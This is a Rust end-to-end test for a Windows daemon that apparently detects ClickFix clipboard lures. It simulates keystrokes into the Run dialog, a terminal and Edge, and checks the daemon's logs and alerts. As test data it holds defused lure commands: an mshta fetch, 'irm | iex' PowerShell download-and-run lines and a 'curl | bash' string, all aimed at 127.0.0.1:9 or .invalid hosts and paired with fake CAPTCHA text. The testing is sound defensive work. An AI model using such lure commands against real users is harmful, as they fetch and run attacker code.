//! Windows end-to-end test. Drives a real desktop session and checks clickfixed's log.
//!
//! Put `windows_e2e.exe` next to `clickfixed.exe` and the `demo` folder, then run it from
//! an interactive session (not over SSH or as a service). It types keystrokes, so don't
//! touch the keyboard for the ~40 seconds it runs. Results go to `e2e\report.txt` next
//! to the executable.
//!
//! Every command it pastes points at 127.0.0.1:9 (the discard port) or `.invalid`, so
//! running one does nothing but print a connection error.
//!
//!   cargo build --release --example windows_e2e -p cfx-daemon --target x86_64-pc-windows-gnu

#[cfg(windows)]
mod imp {
    use std::fmt::Write as _;
    use std::path::{Path, PathBuf};
    use std::process::{Child, Command};
    use std::time::{Duration, Instant};
    use windows_sys::Win32::System::DataExchange::{
        CloseClipboard, GetClipboardData, OpenClipboard,
    };
    use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
    use windows_sys::Win32::System::Ole::CF_UNICODETEXT;
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
        SendInput, INPUT, INPUT_0, INPUT_KEYBOARD, KEYBDINPUT, KEYEVENTF_KEYUP, VK_CONTROL,
        VK_ESCAPE, VK_LWIN, VK_RETURN, VK_TAB,
    };

    const MSHTA: &str = "mshta https://x.invalid/v.mp4 # I am not a robot";
    /// Runs and does nothing (an echo), but scores warn from the Run dialog: Windows lets it
    /// start, so Explorer records it in RunMRU. Windows itself refuses to start the
    /// powershell lures from Win+R. The ID differs per run: RunMRU does not record an exact
    /// repeat of its newest entry.
    fn run_me() -> String {
        let id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_micros() % 1_000_000)
            .unwrap_or(0);
        format!("cmd /c echo clickfixed e2e # I am not a robot - reCAPTCHA Verification ID: {id}")
    }
    /// Lives ~3 s (ping), so the process poller sees it. The lure text after `rem` does
    /// nothing; `^|` keeps cmd from treating it as a pipe.
    const LONG_RUNNING: &str = "cmd /c ping -n 4 127.0.0.1 >nul & rem curl -fsSL https://c2.invalid/x ^| bash # I am not a robot - reCAPTCHA Verification ID: 2165";
    fn lure(tag: &str) -> String {
        format!(
            "powershell -NoProfile -c \"irm http://127.0.0.1:9/{tag} | iex\" # I am not a robot - reCAPTCHA Verification ID: 2165"
        )
    }

    struct Ctx {
        dir: PathBuf,
        exe: PathBuf,
        log: PathBuf,
        config: PathBuf,
        report: String,
        passed: usize,
        failed: usize,
    }

    impl Ctx {
        fn result(&mut self, name: &str, ok: bool, detail: &str) {
            let tag = if ok { "PASS" } else { "FAIL" };
            if ok {
                self.passed += 1;
            } else {
                self.failed += 1;
            }
            let line = format!("[{tag}] {name}\n       {detail}\n");
            print!("{line}");
            self.report.push_str(&line);
        }

        fn start(&self, mode: &str) -> Child {
            let child = Command::new(&self.exe)
                .args(["run", "--mode", mode, "--config"])
                .arg(&self.config)
                .arg("--log-file")
                .arg(&self.log)
                .spawn()
                .expect("start clickfixed.exe");
            sleep(4000);
            child
        }

        fn log_len(&self) -> usize {
            std::fs::read_to_string(&self.log)
                .map(|s| s.len())
                .unwrap_or(0)
        }

        /// First log line after `from` containing every needle, within `ms`.
        fn wait_log(&self, from: usize, needles: &[&str], ms: u64) -> Option<String> {
            let end = Instant::now() + Duration::from_millis(ms);
            loop {
                if let Ok(s) = std::fs::read_to_string(&self.log) {
                    if let Some(l) = s
                        .get(from..)
                        .unwrap_or("")
                        .lines()
                        .find(|l| needles.iter().all(|n| l.contains(n)))
                    {
                        return Some(l.trim().to_string());
                    }
                }
                if Instant::now() > end {
                    return None;
                }
                sleep(200);
            }
        }

        fn check_log(&mut self, name: &str, from: usize, needles: &[&str], ms: u64) -> bool {
            match self.wait_log(from, needles, ms) {
                Some(l) => {
                    self.result(name, true, &short(&l));
                    true
                }
                None => {
                    self.result(name, false, &format!("no log line with {needles:?}"));
                    false
                }
            }
        }
    }

    fn short(l: &str) -> String {
        // Drop the timestamp; keep the message and fields.
        let l = l.split_once("  ").map(|x| x.1).unwrap_or(l).trim();
        l.chars().take(240).collect()
    }

    fn sleep(ms: u64) {
        std::thread::sleep(Duration::from_millis(ms));
    }

    fn key(vk: u16, up: bool) -> INPUT {
        INPUT {
            r#type: INPUT_KEYBOARD,
            Anonymous: INPUT_0 {
                ki: KEYBDINPUT {
                    wVk: vk,
                    wScan: 0,
                    dwFlags: if up { KEYEVENTF_KEYUP } else { 0 },
                    time: 0,
                    dwExtraInfo: 0,
                },
            },
        }
    }

    /// Press `vk` while holding `modifier` (or alone).
    fn press(modifier: Option<u16>, vk: u16) {
        let mut seq = Vec::new();
        if let Some(m) = modifier {
            seq.push(key(m, false));
        }
        seq.push(key(vk, false));
        seq.push(key(vk, true));
        if let Some(m) = modifier {
            seq.push(key(m, true));
        }
        // SAFETY: seq is a valid INPUT array for its length.
        unsafe {
            SendInput(
                seq.len() as u32,
                seq.as_ptr(),
                std::mem::size_of::<INPUT>() as i32,
            );
        }
        sleep(150);
    }

    fn set_clipboard(text: &str) {
        use cfx_collect::ClipboardControl;
        cfx_collect::windows::WindowsCollector::default()
            .replace_clipboard(text.to_string())
            .expect("write clipboard");
        sleep(1200);
    }

    fn get_clipboard() -> String {
        // SAFETY: the clipboard is closed on every path; the memory is locked while read.
        unsafe {
            for _ in 0..20 {
                if OpenClipboard(std::ptr::null_mut()) != 0 {
                    let h = GetClipboardData(CF_UNICODETEXT as u32);
                    let mut out = String::new();
                    if !h.is_null() {
                        let p = GlobalLock(h) as *const u16;
                        if !p.is_null() {
                            let n = (0..).take_while(|&i| *p.add(i) != 0).count();
                            out = String::from_utf16_lossy(std::slice::from_raw_parts(p, n));
                            GlobalUnlock(h);
                        }
                    }
                    CloseClipboard();
                    return out;
                }
                sleep(20);
            }
        }
        String::new()
    }

    fn file_url(p: &Path) -> String {
        format!("file:///{}", p.display().to_string().replace('\\', "/"))
    }

    pub fn main() {
        let here = std::env::current_exe().expect("own path");
        let dir = here.parent().expect("dir").to_path_buf();
        let out = dir.join("e2e");
        let _ = std::fs::remove_dir_all(&out);
        std::fs::create_dir_all(&out).expect("create e2e dir");
        let config = out.join("e2e.toml");
        std::fs::write(
            &config,
            format!(
                "notify = true\nrole = \"engineering\"\n[outputs.file]\nenabled = true\npath = '{}'\n",
                out.join("alerts.json").display()
            ),
        )
        .expect("write config");
        let mut c = Ctx {
            exe: dir.join("clickfixed.exe"),
            log: out.join("clickfixed.log"),
            config,
            dir: dir.clone(),
            report: String::new(),
            passed: 0,
            failed: 0,
        };
        let ver = Command::new("cmd").args(["/c", "ver"]).output();
        let _ = writeln!(
            c.report,
            "clickfixed Windows e2e\n{}\n",
            ver.map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_default()
        );
        println!("clickfixed Windows e2e: don't touch the keyboard for about 40 seconds.\n");

        // 1. One-shot scoring. The lure goes through a pipe: Defender refuses to start a
        // process whose command line contains one, and quarantines a file holding one.
        let o = Command::new(&c.exe)
            .args(["check", "-"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .and_then(|mut ch| {
                use std::io::Write as _;
                ch.stdin
                    .take()
                    .expect("stdin")
                    .write_all(MSHTA.as_bytes())?;
                ch.wait_with_output()
            });
        let (s, err) = o
            .map(|o| {
                (
                    String::from_utf8_lossy(&o.stdout).to_string(),
                    String::from_utf8_lossy(&o.stderr).to_string(),
                )
            })
            .unwrap_or_else(|e| (String::new(), e.to_string()));
        c.result(
            "check: mshta lure scores block",
            s.contains("\"level\": \"block\""),
            s.lines()
                .find(|l| l.contains("\"level\""))
                .unwrap_or(if err.trim().is_empty() {
                    "no output"
                } else {
                    err.trim()
                })
                .trim(),
        );

        // ---------------------------------------------------------------- block mode
        let mut d = c.start("block");
        c.check_log(
            "daemon starts (block mode)",
            0,
            &["clickfixed starting", "Block"],
            3000,
        );
        c.check_log(
            "clipboard listener runs",
            0,
            &["windows clipboard listener running"],
            3000,
        );
        c.check_log(
            "paste-target watcher runs",
            0,
            &["windows paste-target watcher running"],
            3000,
        );
        c.check_log(
            "process poller runs",
            0,
            &["windows process poller running"],
            3000,
        );
        let tray_failed = c
            .wait_log(0, &["tray icon could not be added"], 500)
            .is_some();
        c.result(
            "tray icon added for notifications",
            !tray_failed,
            "no tray error in log",
        );

        // 2. A lure copied by another app: warns, not blocked yet.
        let from = c.log_len();
        set_clipboard(&lure("a"));
        c.check_log(
            "copied lure scores warn",
            from,
            &["clipboard write scored", "level=\"warn\""],
            4000,
        );

        // 3. Win+R: re-scored with the Run dialog, blocked, clipboard replaced.
        let from = c.log_len();
        press(Some(VK_LWIN), b'R' as u16);
        sleep(1500);
        c.check_log(
            "Win+R re-scores with the Run dialog and blocks",
            from,
            &[
                "paste target focused",
                "target=\"run_dialog\"",
                "level=\"block\"",
            ],
            4000,
        );
        let clip = get_clipboard();
        c.result(
            "block mode replaced the clipboard before paste",
            clip.starts_with("# clickfixed blocked"),
            &format!(
                "clipboard now: {}",
                clip.chars().take(70).collect::<String>()
            ),
        );
        let own = c.wait_log(from, &["clipboard write scored", "level=\"clean\""], 1500);
        c.result(
            "own replacement is not re-scored",
            own.is_none(),
            "no new clipboard event for clickfixed's own write",
        );
        press(None, VK_ESCAPE);

        // 4. A terminal coming to the front is a paste target too.
        set_clipboard(&lure("b"));
        let from = c.log_len();
        let mut term = Command::new("cmd")
            .args([
                "/c",
                "start",
                "clickfixed-e2e",
                "/wait",
                "cmd",
                "/k",
                "echo e2e terminal",
            ])
            .spawn()
            .ok();
        sleep(2500);
        c.check_log(
            "terminal window is recognised as a paste target",
            from,
            &["paste target focused", "target=\"terminal\""],
            4000,
        );
        let _ = Command::new("taskkill")
            .args(["/fi", "WINDOWTITLE eq clickfixed-e2e*", "/f"])
            .output();
        if let Some(t) = term.as_mut() {
            let _ = t.kill();
        }
        let _ = d.kill();
        let _ = d.wait();
        sleep(1000);

        // ---------------------------------------------------------------- warn mode
        let mut d = c.start("warn");

        // 5. Paste into Win+R and run: RunMRU records it as run from the Run dialog.
        set_clipboard(&run_me());
        let from = c.log_len();
        press(Some(VK_LWIN), b'R' as u16);
        sleep(1200);
        c.check_log(
            "warn mode: Win+R warns without replacing",
            from,
            &["paste target focused", "target=\"run_dialog\""],
            4000,
        );
        c.result(
            "warn mode leaves the clipboard alone",
            get_clipboard().starts_with("cmd /c echo clickfixed"),
            "clipboard still holds the copied command",
        );
        press(Some(VK_CONTROL), b'V' as u16);
        sleep(300);
        press(None, VK_RETURN);
        c.check_log(
            "command run from Win+R is seen (RunMRU / process)",
            from,
            &["parent=run_dialog"],
            8000,
        );

        // 6. The process poller: a pasted lure started by another program is matched to
        // the clipboard when it runs.
        set_clipboard(LONG_RUNNING);
        let from = c.log_len();
        let started = {
            use std::os::windows::process::CommandExt;
            Command::new("cmd")
                .raw_arg(LONG_RUNNING.strip_prefix("cmd ").unwrap())
                .spawn()
        };
        match started {
            Ok(mut p) => {
                c.check_log(
                    "process poller matches a running pasted command to the clipboard",
                    from,
                    &["PASTED COMMAND EXECUTED"],
                    6000,
                );
                let _ = p.wait();
            }
            Err(e) => c.result(
                "process poller matches a running pasted command to the clipboard",
                false,
                &format!("could not start the test command: {e}"),
            ),
        }

        // 7. The demo lure page in Edge.
        let page = std::env::temp_dir().join("clickfixed-lure.html");
        let copied = std::fs::copy(c.dir.join("demo").join("lure.html"), &page).is_ok();
        if copied {
            let from = c.log_len();
            let _ = Command::new("cmd")
                .args([
                    "/c",
                    "start",
                    "",
                    "msedge",
                    "--no-first-run",
                    "--no-default-browser-check",
                ])
                .arg(format!("--app={}", file_url(&page)))
                .spawn();
            sleep(9000);
            press(None, VK_TAB);
            press(None, VK_RETURN);
            let ok = c.check_log(
                "Edge: lure page copy is flagged with the browser as source",
                from,
                &["clipboard write scored", "source=msedge"],
                6000,
            );
            if !ok {
                let _ = writeln!(
                    c.report,
                    "       (the Edge step needs Edge to open without a first-run screen; a FAIL here may be the browser, not clickfixed)"
                );
            }
            let _ = Command::new("taskkill")
                .args(["/im", "msedge.exe", "/f"])
                .output();
        } else {
            c.result(
                "Edge: lure page",
                false,
                "demo\\lure.html not found next to the exe",
            );
        }

        let _ = d.kill();
        let _ = d.wait();

        // 8. The alerts written on Windows.
        let alerts: Vec<serde_json::Value> = std::fs::read_to_string(out.join("alerts.json"))
            .unwrap_or_default()
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect();
        let users: Vec<&str> = alerts
            .iter()
            .filter_map(|a| a["user"]["name"].as_str())
            .collect();
        c.result(
            "alerts name the Windows user",
            !users.is_empty() && users.iter().all(|u| *u != "unknown"),
            &format!("user.name = {:?}", users.first()),
        );
        c.result(
            "alerts carry the Windows analytic (AN0962)",
            !alerts.is_empty()
                && alerts
                    .iter()
                    .all(|a| a["clickfixed"]["analytic"]["id"] == "AN0962"),
            &format!("{} alerts", alerts.len()),
        );
        let run_exec = alerts.iter().any(|a| {
            a["event"]["action"] == "pasted-command-executed"
                && a["clickfixed"]["target"]["kind"] == "run_dialog"
        });
        c.result(
            "a command run from Win+R is alerted with target run_dialog",
            run_exec,
            "pasted-command-executed with clickfixed.target.kind = run_dialog",
        );

        let _ = writeln!(
            c.report,
            "\n{} passed, {} failed. Full log: e2e\\clickfixed.log, alerts: e2e\\alerts.json",
            c.passed, c.failed
        );
        let _ = std::fs::write(out.join("report.txt"), &c.report);
        println!(
            "\n{} passed, {} failed. Report: {}",
            c.passed,
            c.failed,
            out.join("report.txt").display()
        );
    }
}

fn main() {
    #[cfg(windows)]
    imp::main();
    #[cfg(not(windows))]
    eprintln!("windows_e2e runs on Windows only");
}
